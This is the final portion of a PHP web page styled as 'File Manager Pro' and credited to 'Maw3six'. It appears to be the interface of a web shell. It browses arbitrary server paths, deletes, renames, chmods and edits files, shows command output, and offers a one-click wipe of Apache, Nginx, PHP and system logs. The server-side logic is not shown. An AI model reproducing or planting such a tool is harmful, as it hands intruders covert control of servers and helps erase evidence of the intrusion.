            </div>

        </div>

        

        <!-- Server Maintenance -->

        <div class="bg-dark-900 border border-dark-700 rounded-lg shadow-xl mb-6">

            <div class="p-4 border-b border-dark-700">

                <h2 class="text-lg font-bold text-orange-400">Server Maintenance</h2>

                <p class="text-gray-400 text-sm">Quick server maintenance and optimization tools</p>

            </div>

            

            <div class="p-4">

                <div class="grid grid-cols-1 md:grid-cols-3 gap-3">

                    <!-- Clean All Logs -->

                    <form method="post" class="group">

                        <button 

                            type="submit" 

                            name="clean_logs"

                            class="w-full bg-red-600 hover:bg-red-700 text-white p-3 rounded font-medium transition duration-200 flex flex-col items-center gap-1 group-hover:shadow-lg"

                            onclick="return confirm('Are you sure you want to clean all server logs? This action cannot be undone.')">

                            <div class="text-sm font-bold">LOGS</div>

                            <div class="text-xs font-medium">Clean All Logs</div>

                            <div class="text-xs text-red-200 text-center">Apache, Nginx, PHP, System</div>

                        </button>

                    </form>

                    

                    <!-- Clear LiteSpeed Cache -->

                    <form method="post" class="group">

                        <button 

                            type="submit" 

                            name="clear_cache"

                            class="w-full bg-blue-600 hover:bg-blue-700 text-white p-3 rounded font-medium transition duration-200 flex flex-col items-center gap-1 group-hover:shadow-lg"

                            onclick="return confirm('Clear all cache including LiteSpeed, OPcache, and file cache?')">

                            <div class="text-sm font-bold">CACHE</div>

                            <div class="text-xs font-medium">Clear All Cache</div>

                            <div class="text-xs text-blue-200 text-center">LiteSpeed, OPcache, Files</div>

                        </button>

                    </form>

                    

                    <!-- Clean Temp Files -->

                    <form method="post" class="group">

                        <button 

                            type="submit" 

                            name="clear_temp"

                            class="w-full bg-green-600 hover:bg-green-700 text-white p-3 rounded font-medium transition duration-200 flex flex-col items-center gap-1 group-hover:shadow-lg"

                            onclick="return confirm('Clean temporary files older than 1 day?')">

                            <div class="text-sm font-bold">TEMP</div>

                            <div class="text-xs font-medium">Clean Temp Files</div>

                            <div class="text-xs text-green-200 text-center">Remove old temporary files</div>

                        </button>

                    </form>

                </div>

                

                <!-- Warning Notice -->

                <div class="mt-3 p-2 bg-yellow-900/30 border border-yellow-700 rounded">

                    <div class="flex items-start gap-2">

                        <span class="text-yellow-400 text-sm font-bold">!</span>

                        <div class="text-xs text-yellow-200">

                            <strong>Warning:</strong> These maintenance actions require appropriate server permissions. 

                            Some operations may need root/administrator access. Always backup important data before running maintenance tasks.

                        </div>

                    </div>

                </div>

            </div>

        </div>

        

        <!-- Maintenance Output -->

        <?php if (!empty($maintenance_output)): ?>

        <div class="bg-dark-900 border border-dark-700 rounded-lg shadow-xl mb-6">

            <div class="p-4 border-b border-dark-700">

                <h2 class="text-lg font-bold text-orange-400">Maintenance Results</h2>

            </div>

            <div class="p-4">

                <pre class="bg-dark-950 border border-dark-800 rounded-md p-4 text-orange-400 text-sm overflow-x-auto whitespace-pre-wrap"><?= htmlspecialchars($maintenance_output) ?></pre>

            </div>

        </div>

        <?php endif; ?>

        

        <!-- Command Output -->

        <?php if (!empty($output)): ?>

        <div class="bg-dark-900 border border-dark-700 rounded-lg shadow-xl mb-6">

            <div class="p-4 border-b border-dark-700">

                <h2 class="text-lg font-bold text-green-400">Command Output</h2>

            </div>

            <div class="p-4">

                <pre class="bg-dark-950 border border-dark-800 rounded-md p-4 text-green-400 text-sm overflow-x-auto whitespace-pre-wrap"><?= htmlspecialchars($output) ?></pre>

            </div>

        </div>

        <?php endif; ?>

        

        <!-- File List -->

        <div class="bg-dark-900 border border-dark-700 rounded-lg shadow-xl">

            <div class="p-4 border-b border-dark-700">

                <h2 class="text-lg font-bold">Directory Contents</h2>

            </div>

            

            <div class="overflow-x-auto">

                <table class="w-full">

                    <thead class="bg-dark-800">

                        <tr>

                            <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">

                                <input type="checkbox" id="select-all" class="rounded bg-dark-700 border-dark-600 text-cyan-600 focus:ring-cyan-500 focus:ring-2" onchange="toggleAllFiles()">

                            </th>

                            <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Name</th>

                            <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Type</th>

                            <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Size</th>

                            <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Permissions</th>

                            <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">Actions</th>

                        </tr>

                    </thead>

                    <tbody class="divide-y divide-dark-700">

                        <?php foreach ($files as $f):

                            if ($f === "." || $f === "..") continue;

                            $full = $path.'/'.$f;

                            $perm_ok = is_readable($full) && is_writable($full);

                            $size_display = is_file($full) ? number_format(filesize($full)) . ' B' : '-';

                            $is_archive = is_file($full) && preg_match('/\.(zip|rar|tar|gz|7z)$/i', $f);

                        ?>

                        <tr class="hover:bg-dark-800 transition duration-150">

                            <td class="px-4 py-3">

                                <input 

                                    type="checkbox" 

                                    name="selected_files[]" 

                                    value="<?= htmlspecialchars($f) ?>"

                                    class="file-checkbox rounded bg-dark-700 border-dark-600 text-cyan-600 focus:ring-cyan-500 focus:ring-2"

                                    form="zip-form">

                            </td>

                            <td class="px-4 py-3">

                                <div class="flex items-center">

                                    <span class="<?= is_dir($full) ? 'text-blue-400' : ($is_archive ? 'text-yellow-400' : 'text-gray-300') ?> mr-2">

                                        <?= is_dir($full) ? 'DIR' : ($is_archive ? 'ZIP' : 'FILE') ?>

                                    </span>

                                    <a 

                                        href="?path=<?= urlencode(realpath($full)) ?>" 

                                        class="text-gray-100 hover:text-blue-400 transition duration-150 font-medium">

                                        <?= htmlspecialchars($f) ?>

                                    </a>

                                </div>

                            </td>

                            <td class="px-4 py-3 text-sm text-gray-400">

                                <?= is_dir($full) ? "Directory" : ($is_archive ? "Archive" : "File") ?>

                            </td>

                            <td class="px-4 py-3 text-sm text-gray-400">

                                <?= $size_display ?>

                            </td>

                            <td class="px-4 py-3">

                                <span class="<?= $perm_ok ? 'text-green-400' : 'text-red-400' ?> text-sm font-medium">

                                    <?= $perm_ok ? 'R/W' : 'Limited' ?>

                                </span>

                            </td>

                            <td class="px-4 py-3">

                                <div class="flex flex-wrap gap-1">

                                    <!-- Extract for archive files -->

                                    <?php if ($is_archive): ?>

                                    <form method="post" style="display:inline;">

                                        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                                        <input type="hidden" name="unzip_file" value="<?= htmlspecialchars($f) ?>">

                                        <button 

                                            class="bg-yellow-600 hover:bg-yellow-700 text-white text-xs px-2 py-1 rounded transition duration-200 min-w-[50px]" 

                                            onclick="return confirm('Extract <?= htmlspecialchars($f) ?> to a new folder?')">

                                            Extract

                                        </button>

                                    </form>

                                    <?php endif; ?>

                                    

                                    <!-- Delete -->

                                    <form method="post" style="display:inline;">

                                        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                                        <input type="hidden" name="delete" value="<?= htmlspecialchars($f) ?>">

                                        <button 

                                            class="bg-red-600 hover:bg-red-700 text-white text-xs px-2 py-1 rounded transition duration-200 min-w-[50px]" 

                                            onclick="return confirm('Delete <?= htmlspecialchars($f) ?>?')">

                                            Delete

                                        </button>

                                    </form>

                                    

                                    <!-- Rename -->

                                    <form method="post" style="display:inline;" class="flex gap-1">

                                        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                                        <input type="hidden" name="rename_from" value="<?= htmlspecialchars($f) ?>">

                                        <input 

                                            type="text" 

                                            name="rename_to" 

                                            placeholder="New name" 

                                            required

                                            class="w-16 px-1 py-1 bg-dark-800 border border-dark-600 rounded text-gray-100 text-xs focus:outline-none focus:ring-1 focus:ring-blue-500">

                                        <button 

                                            class="bg-orange-600 hover:bg-orange-700 text-white text-xs px-2 py-1 rounded transition duration-200 min-w-[50px]">

                                            Rename

                                        </button>

                                    </form>

                                    

                                    <!-- Chmod -->

                                    <form method="post" style="display:inline;" class="flex gap-1">

                                        <input type="hidden" name="current_path" value="<?= htmlspecialchars($path) ?>">

                                        <input type="hidden" name="chmod_file" value="<?= htmlspecialchars($full) ?>">

                                        <input 

                                            type="text" 

                                            name="chmod_value" 

                                            placeholder="755" 

                                            class="w-10 px-1 py-1 bg-dark-800 border border-dark-600 rounded text-gray-100 text-xs focus:outline-none focus:ring-1 focus:ring-purple-500">

                                        <button 

                                            class="bg-purple-600 hover:bg-purple-700 text-white text-xs px-2 py-1 rounded transition duration-200 min-w-[50px]">

                                            Chmod

                                        </button>

                                    </form>

                                    

                                    <!-- Edit (for files only) -->

                                    <?php if (is_file($full) && !$is_archive): ?>

                                    <a 

                                        href="?edit=<?= urlencode($full) ?>" 

                                        class="bg-green-600 hover:bg-green-700 text-white text-xs px-2 py-1 rounded transition duration-200 inline-block min-w-[50px] text-center">

                                        Edit

                                    </a>

                                    <?php endif; ?>

                                </div>

                            </td>

                        </tr>

                        <?php endforeach; ?>

                    </tbody>

                </table>

            </div>

        </div>

    </div>

    

    <!-- Footer -->

    <footer class="bg-dark-900 border-t border-dark-700 mt-8">

        <div class="container mx-auto p-4 max-w-7xl">

            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">

                <!-- File Manager Info -->

                <div class="space-y-1">

                    <h4 class="font-bold text-gray-300">File Manager</h4>

                    <div class="text-gray-400 space-y-1">

                        <div>Version: 2.0 Professional</div>

                        <div>Built with: PHP <?= PHP_VERSION ?></div>

                        <div>Framework: Tailwind CSS</div>

                        <div>Author: <a href="t.me/maw3six">Maw3six</a></div>

                    </div>

                </div>

                

                <!-- Features -->

                <div class="space-y-1">

                    <h4 class="font-bold text-gray-300">Features</h4>

                    <div class="text-gray-400 space-y-1">

                        <div>• File & folder management</div>

                        <div>• Archive operations (ZIP/Unzip)</div>

                        <div>• Server maintenance tools</div>

                        <div>• System information display</div>

                        <div>• Breadcrumb navigation</div>

                    </div>

                </div>

                

                <!-- System Status -->

                <div class="space-y-1">

                    <h4 class="font-bold text-gray-300">System Status</h4>

                    <div class="text-gray-400 space-y-1">

                        <div>Server: <?= htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') ?></div>

                        <div>PHP Memory: <?= ini_get('memory_limit') ?></div>

                        <div>Current Time: <?= date('Y-m-d H:i:s T') ?></div>

                        <div>Disk Free: <?= disk_free_space($path) ? round(disk_free_space($path) / 1024 / 1024 / 1024, 1) . ' GB' : 'Unknown' ?></div>

                    </div>

                </div>

            </div>

            

            <!-- Bottom Bar -->

            <div class="mt-4 pt-3 border-t border-dark-700 flex flex-col md:flex-row justify-between items-center text-xs text-gray-500 space-y-2 md:space-y-0">

                <div>

                    © <?= date('Y') ?> File Manager Pro. All rights reserved.

                </div>

                <div class="flex items-center space-x-4">

                    <span class="flex items-center space-x-1">

                        <span class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>

                        <span>System Online</span>

                    </span>

                    <span>•</span>

                    <span>Secure Session Active</span>

                </div>

            </div>

        </div>

    </footer>

    

    <script>

        // Auto-focus on first input when page loads

        document.addEventListener('DOMContentLoaded', function() {

            const firstInput = document.querySelector('input[type="text"], input[type="password"]');

            if (firstInput) firstInput.focus();

        });

        

        // Handle file input display

        document.addEventListener('DOMContentLoaded', function() {

            const fileInput = document.getElementById('file-upload');

            const fileName = document.getElementById('file-name');

            

            if (fileInput && fileName) {

                fileInput.addEventListener('change', function() {

                    if (this.files && this.files.length > 0) {

                        const file = this.files[0];

                        fileName.textContent = file.name;

                        fileName.classList.remove('text-gray-400');

                        fileName.classList.add('text-gray-100');

                    } else {

                        fileName.textContent = 'Choose file...';

                        fileName.classList.remove('text-gray-100');

                        fileName.classList.add('text-gray-400');

                    }

                });

            }

        });

        

        // Toggle manual path entry

        document.addEventListener('DOMContentLoaded', function() {

            const toggleButton = document.getElementById('toggle-manual-path');

            const manualForm = document.getElementById('manual-path-form');

            const toggleIcon = document.getElementById('toggle-icon');

            

            if (toggleButton && manualForm && toggleIcon) {

                toggleButton.addEventListener('click', function() {

                    if (manualForm.classList.contains('hidden')) {

                        manualForm.classList.remove('hidden');

                        toggleIcon.textContent = '▼';

                        // Focus on the path input when opened

                        const pathInput = manualForm.querySelector('input[name="path"]');

                        if (pathInput) {

                            setTimeout(() => pathInput.focus(), 100);

                        }

                    } else {

                        manualForm.classList.add('hidden');

                        toggleIcon.textContent = '▶';

                    }

                });

            }

        });

        

        // Archive operations JavaScript

        function toggleAllFiles() {

            const selectAll = document.getElementById('select-all');

            const fileCheckboxes = document.querySelectorAll('.file-checkbox');

            

            fileCheckboxes.forEach(checkbox => {

                checkbox.checked = selectAll.checked;

            });

        }

        

        function validateZipSelection() {

            const fileCheckboxes = document.querySelectorAll('.file-checkbox:checked');

            const zipName = document.querySelector('input[name="zip_name"]').value.trim();

            

            if (fileCheckboxes.length === 0) {

                alert('Please select at least one file or folder to compress.');

                return false;

            }

            

            if (!zipName) {

                alert('Please enter a name for the ZIP archive.');

                return false;

            }

            

            // Confirm the operation

            const selectedFiles = Array.from(fileCheckboxes).map(cb => cb.value);

            const message = `Create ZIP archive "${zipName}.zip" containing:\n${selectedFiles.join('\n')}\n\nContinue?`;

            

            return confirm(message);

        }

        

        // Update select all checkbox based on individual selections

        document.addEventListener('DOMContentLoaded', function() {

            const selectAll = document.getElementById('select-all');

            const fileCheckboxes = document.querySelectorAll('.file-checkbox');

            

            fileCheckboxes.forEach(checkbox => {

                checkbox.addEventListener('change', function() {

                    const checkedBoxes = document.querySelectorAll('.file-checkbox:checked');

                    selectAll.checked = checkedBoxes.length === fileCheckboxes.length;

                    selectAll.indeterminate = checkedBoxes.length > 0 && checkedBoxes.length < fileCheckboxes.length;

                });

            });

        });

        

        // Confirm delete actions

        function confirmDelete(filename) {

            return confirm('Are you sure you want to delete "' + filename + '"?');

        }

    </script>

</body>

</html>
